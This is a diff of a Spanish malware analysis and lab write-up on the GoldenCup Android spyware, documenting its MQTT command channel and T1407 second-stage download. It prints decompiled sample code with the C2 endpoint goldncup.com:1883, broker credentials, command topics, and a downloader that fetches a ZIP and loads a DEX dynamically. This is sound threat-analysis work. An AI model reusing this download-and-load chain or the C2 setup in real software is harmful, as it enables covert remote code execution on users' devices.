@@ -4,13 +4,15 @@
 
 ### S0535 -- GoldenCup
 
-Golden Cup es un programa espía para Android asociado a aplicaciones dirigidas a seguidores de la Copa Mundial, como documentó Symantec en su [análisis de la campaña](https://symantec-enterprise-blogs.security.com/blogs/expert-perspectives/goldencup-new-cyber-threat-targeting-world-cup-fans). La muestra analizada contiene la primera etapa: establece un canal de mando mediante MQTT y puede recibir la URL de un segundo componente, descargarlo por HTTP y cargarlo dinámicamente. Esta cadena permite estudiar [**T1407 - Download New Code at Runtime**](https://attack.mitre.org/techniques/T1407/), técnica que MITRE atribuye a [Golden Cup (S0535)](https://attack.mitre.org/software/S0535/).
+Golden Cup es un programa espía para Android asociado a una aplicación dirigida a soldados israelitas seguidores de la Copa Mundial 2018, como documentó Symantec en su [análisis de la campaña](https://symantec-enterprise-blogs.security.com/blogs/expert-perspectives/goldencup-new-cyber-threat-targeting-world-cup-fans). Este malware fue concebido como un segundo intento, sucesor de los malwares GlanceLove y WinkChat dado a que estos fallaron en su cadena de ingeniería social. El mundial de futbol fue, sin lugar a dudas, una elección más precisa. Se presume también que fue desarrollado con poco margen de tiempo, debido a la carencia completa de ofuscación. La familia es otro ejemplo más de la falta de seguridad en Google Play Store, al haberse distribuido desde la plataforma.
 
-| Artefacto | Tipo | Identificación | SHA-256 |
-|---|---|---|---|
-| `GoldenCup.apk` | APK de Android | Paquete [`anew.football.cup.world.com.worldcup`]{.content-visible unless-format="pdf"}[`\nolinkurl{anew.football.cup.world.com.worldcup}`{=latex}]{.content-visible when-format="pdf"}; versión 1.1; API mínima 14 y objetivo 21 | [`166f3a863bb2b66bda9c76dccf9529d5237f6394721f46635b053870eb2fcc5a`]{.content-visible unless-format="pdf"}[`\nolinkurl{166f3a863bb2b66bda9c76dccf9529d5237f6394721f46635b053870eb2fcc5a}`{=latex}]{.content-visible when-format="pdf"} |
+![Ficha de Golden Cup en Google Play Store, presentada como una aplicación sobre la Copa Mundial de 2018.](<images/GoldenCup.png>){#fig-goldencup-play-store fig-alt="Captura de la ficha y las imágenes promocionales de Golden Cup en Google Play Store."}
 
-El valor `targetSdkVersion=21` declara la API objetivo de la aplicación, pero no exige por sí solo que la muestra se ejecute exclusivamente sobre Android 5.0. Para el laboratorio se utiliza un dispositivo virtual con API 21, una elección compatible con el manifiesto y con las llamadas empleadas por la muestra.
+La muestra analizada establece un canal de mando mediante MQTT y puede recibir la URL de un segundo componente, descargarlo por HTTP y cargarlo dinámicamente. Esta cadena permite estudiar [**T1407 - Download New Code at Runtime**](https://attack.mitre.org/techniques/T1407/), técnica que MITRE atribuye a [Golden Cup (S0535)](https://attack.mitre.org/software/S0535/). 
+
+| Artefacto       | Tipo           | Identificación                                                                           | SHA-256                                                            |
+| --------------- | -------------- | ---------------------------------------------------------------------------------------- | ------------------------------------------------------------------ |
+| `GoldenCup.apk` | APK de Android | Paquete `anew.football.cup.world.com.worldcup`; versión 1.1; API mínima 14 y objetivo 21 | `166f3a863bb2b66bda9c76dccf9529d5237f6394721f46635b053870eb2fcc5a` |
 
 #### Generación del identificador de cliente MQTT
 
@@ -111,11 +113,11 @@ public static String encode(String str) {
 }
 ```
 
-Este resultado identifica al cliente tanto en la sesión MQTT como en los temas utilizados para recibir órdenes y publicar estados. En la ejecución preparada para el laboratorio, el valor obtenido es `51111110635824006`.
+Este resultado identifica al cliente tanto en la sesión MQTT como en los temas utilizados para recibir órdenes y publicar estados. En este caso se ha decidido ejecutar la muestra en una máquina virtual y hacer análisis dinámico para ver que valor "escupe" por red en base a los parámetros que trae una máquina de Android Studio. El valor obtenido es `51111110635824006`.
 
 #### Conexión con el bróker
 
-La clase `GConfig` construye el dominio letra a letra. Una vez resuelta la ofuscación, el extremo inicial queda definido como [`tcp://www.goldncup.com:1883`]{.content-visible unless-format="pdf"}[`\nolinkurl{tcp://www.goldncup.com:1883}`{=latex}]{.content-visible when-format="pdf"}:
+La clase `GConfig` construye el dominio letra a letra en base al enumerado `Letter`. En este caso se ve como el código ha sido escrito para ser ofuscado en el futuro (usa un enumerado para generar una cadena) aunque esta no ha sido aplicada aun. El extremo inicial queda definido como `tcp://www.goldncup.com:1883`:
 
 ```java
 public static final String TCP = Utils
@@ -175,18 +177,7 @@ private final String PASSWORD = "4"
     .concat("]");
 ```
 
-Al no existir TLS, el paquete MQTT `CONNECT` permite observar estas credenciales y el identificador del cliente en la captura. El broker del laboratorio acepta conexiones anónimas para simplificar la ejecución, pero la muestra envía igualmente los campos de usuario y contraseña.
-
-En el laboratorio normalizado, el DNS controlado utiliza `10.230.35.53` y responde tanto por el nombre completo como por el dominio base. Los dos nombres se asocian a `107.175.144.26`, uno de los IOC IP que Symantec publica para la campaña Golden Cup. La referencia no vincula individualmente cada dirección con cada dominio; por ello, la asignación concreta a `goldncup.com` es una decisión documentada del laboratorio, mientras que el dominio y la pertenencia de la IP al conjunto de IOC proceden de la referencia.
-
-```text
-www.goldncup.com = 107.175.144.26
-goldncup.com = 107.175.144.26
-```
-
-La dirección pública se asigna exclusivamente al *namespace* aislado del C2. La topología no dispone de ruta por defecto y nunca intenta alcanzar al titular real de la dirección.
-
-Después de recibir un `CONNACK` satisfactorio, el cliente se suscribe con calidad de servicio 2 a todos los temas situados bajo su espacio de órdenes:
+Al no existir TLS, el paquete MQTT `CONNECT` permite observar estas credenciales y el identificador del cliente. Después de recibir un `CONNACK` satisfactorio, el cliente se suscribe con calidad de servicio 2 a todos los temas situados bajo su espacio de órdenes:
 
 ```java
 public static final String SUBSCRIPTION_TOPIC =
@@ -208,7 +199,7 @@ private void subscribeToTopic() {
 }
 ```
 
-Las constantes resuelven el tema como `RT/SV/<client-id>/#`. En el laboratorio se observa [`RT/SV/51111110635824006/#`]{.content-visible unless-format="pdf"}[`\nolinkurl{RT/SV/51111110635824006/#}`{=latex}]{.content-visible when-format="pdf"}. El comodín multinivel permite que el broker entregue todas las órdenes publicadas bajo el espacio asignado a ese dispositivo.
+Las constantes resuelven el tema como `RT/SV/<client-id>/#`. Durante el análisis estático se observa `RT/SV/51111110635824006/#`. El comodín multinivel permite que el broker entregue todas las órdenes publicadas bajo el espacio asignado a ese dispositivo.
 
 Una vez completada la conexión, el cliente también publica su estado en el espacio inverso, reservado para mensajes de la aplicación al servidor:
 
@@ -274,7 +265,7 @@ if (parts.length == 5
 | `RT/SV/<client-id>/C/c` | Responder a la comprobación de disponibilidad |
 | `RT/SV/<client-id>/C/d` | Sustituir el dominio del servidor y reiniciar los servicios de comunicación |
 
-La ruta seleccionada para T1407 es la orden `a`. El cuerpo de la publicación no contiene el artefacto: contiene la URL que se entrega sin modificaciones al constructor de `DwrFileDownloader`:
+El tema seleccionado para T1407 esta formado con la orden `a`. El cuerpo de la publicación no contiene el artefacto: contiene la URL que se entrega sin modificaciones al constructor de `DwrFileDownloader`:
 
 ```java
 if (parts[4].equals(DwnMConstants.INSTALL_APP_CMD)) {
@@ -343,7 +334,7 @@ return checkedInput.getChecksum().getValue()
     );
 ```
 
-Por ejemplo, `stage_1725773520.data` se transforma en `stage_1725773520.zip`, cuyo Adler-32 debe ser `1725773520`. Tras la extracción, el descargador exige que exista exactamente un archivo con extensión `.dex`, publica `YES` en `RT/AP/<client-id>/I/B` y arranca `MainService`. Este acuse confirma la recepción de un DEX, no que su inicialización posterior haya finalizado correctamente.
+Por ejemplo, `stage_1725773520.data` se transforma en `stage_1725773520.zip`, cuyo Adler-32 debe ser `1725773520`. Tras la extracción, el descargador exige que exista exactamente un archivo con extensión `.dex`, publica `YES` en `RT/AP/<client-id>/I/B` y arranca `MainService`. Este acuse confirma la recepción de un DEX, no que su inicialización posterior haya finalizado correctamente. La segunda en realidad no nos es de tanto interés, nuestro objetivo se basa en obtener un PCAP, que se instale localmente no importa y permite ahorrar tiempo en el análisis.
 
 Las clases `ConnManager`, `ReceiverManager` y `TaskManager` completan la relación con T1407: crean un `DexClassLoader` sobre `out.dex` y recuperan las implementaciones de la segunda etapa. Una vez resueltas las cadenas construidas mediante `Letter`, el fragmento de `ConnManager` equivale a lo siguiente:
 
@@ -366,14 +357,15 @@ De este modo, la publicación MQTT de la orden, la petición HTTP y la respuesta
 
 El diagrama representa la ruta mínima desde la resolución del extremo hasta la recepción del segundo componente:
 
+
 ```{=latex}
 \clearpage
 ```
 
 ```{mermaid}
 %%| label: fig-goldencup-comunicaciones
-%%| fig-cap: "Secuencia de comunicaciones reproducida para GoldenCup."
-%%| fig-width: 6.0
+%%| fig-cap: "Recepción por MQTT de la URL de la segunda etapa de GoldenCup y descarga posterior mediante HTTP."
+%%| fig-width: 6
 sequenceDiagram
     participant V as "Golden Cup"
     participant D as "DNS controlado"
@@ -396,27 +388,14 @@ sequenceDiagram
     V->>M: PUBLISH RT/AP/<client-id>/I/B con YES
 ```
 
-```{=latex}
-\clearpage
-```
-
-
 #### Laboratorio de generación del PCAP
 
-El laboratorio ejecuta la APK original en el AVD `golden_api21_aosp`, basado en Android API 21. Android Emulator permanece en Windows y Kali WSL aloja las entidades controladas.
+El laboratorio ejecuta la APK original en una máquina virtual, basada en Android API 21. Android Emulator permanece en Windows y Kali WSL aloja las entidades controladas. La configuración se ha establecido de la siguiente manera:
 
-| Entidad | Dirección y servicio | Procedencia |
-|---|---|---|
-| DNS controlado | `10.230.35.53:53` | Dirección privada asignada al resolutor del laboratorio. |
+| Entidad          | Dirección y servicio                        | Procedencia                                                                                                                                                                                                                                                             |
+| ---------------- | ------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| DNS controlado   | `10.230.35.53:53`                           | Dirección privada asignada al resolutor del laboratorio.                                                                                                                                                                                                                |
 | C2 de Golden Cup | `107.175.144.26:1883` y `107.175.144.26:80` | IOC publicado por Symantec en el [análisis de Golden Cup](https://symantec-enterprise-blogs.security.com/blogs/expert-perspectives/goldencup-new-cyber-threat-targeting-world-cup-fans). El DNS lo entrega para `goldncup.com`; MQTT y HTTP comparten la misma entidad. |
-| Operador MQTT | `10.230.35.20` | Dirección privada asignada al participante que publica la orden. No es un IOC ni se anuncia a la muestra. |
+| Operador MQTT    | `10.230.35.20`                              | Dirección privada asignada al participante que publica la orden. No es un IOC ni se anuncia a la muestra.                                                                                                                                                               |
 
-El fichero `mqtt-server.conf` del laboratorio original se ha trasladado al pipeline. Mosquitto sigue aceptando la sesión real de Eclipse Paho, incluidas las credenciales, el identificador, la sesión persistente y los intercambios QoS 2. El servidor HTTP original también se conserva: genera un contenedor `.data` con AES-ECB, introduce la clave de 32 bytes en la posición esperada y encapsula una entrada `out.dex`. Por defecto, dicha entrada es un marcador inerte, no un DEX ejecutable.
-
-Una entidad de operador se suscribe a `RT/AP/+/I/A` antes de que arranque el AVD. Cuando recibe `ON`, obtiene el identificador real del cliente, espera a que finalice la suscripción de la APK y publica con QoS 2 la URL recién generada en `RT/SV/<client-id>/C/a`. A continuación espera el acuse `RT/AP/<client-id>/I/B`. Esta automatización reproduce las órdenes manuales del laboratorio original sin inventar mensajes ni fijar de antemano el identificador o el valor Adler-32.
-
-No es necesario instalar una autoridad de certificación: DNS, MQTT y HTTP circulan sin TLS. La clave AES forma parte del contenedor descargado y no es material de descifrado de la sesión de red.
-
-
-La evidencia esperada comprende la consulta DNS que responde `107.175.144.26`, el `CONNECT` y la suscripción MQTT, la publicación de estado, la orden `C/a`, la petición HTTP del fichero `.data`, la respuesta `200 OK` y, cuando la extracción deja un único DEX, el acuse `YES`. Una PCAP que contenga esta cadena demuestra la entrega del nuevo código; la ejecución de `out.dex` debe corroborarse mediante evidencia local y no se deduce únicamente de la captura.
-
+El fichero `mqtt-server.conf` del laboratorio original se ha utilizado para la emulación. Mosquitto ha sido usado para el tráfico MQTT, debido a su sencillez de uso. El resto ha sido escrito en Python.
